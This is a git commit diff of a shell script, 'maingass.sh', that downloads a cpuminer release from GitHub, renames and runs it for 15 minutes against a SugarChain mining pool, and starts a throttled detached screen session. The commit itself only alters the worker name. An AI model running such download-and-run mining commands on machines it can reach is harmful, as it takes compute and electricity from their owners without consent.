e5b8f1ac87c551584464ae6e5da0fc97454f44f8
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-14 09:31:08 +0800

    Update maingass.sh

--- maingass.sh
+++ maingass.sh
@@ -9,5 +9,5 @@ screen -dmS randum ./limiting.sh cpuminer-avx 6575
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
 tar -xf cpuminer-opt-linux.tar.gz 
 mv cpuminer-avx go
-timeout 15m ./go -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbaah 
+timeout 15m ./go -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbah 
 
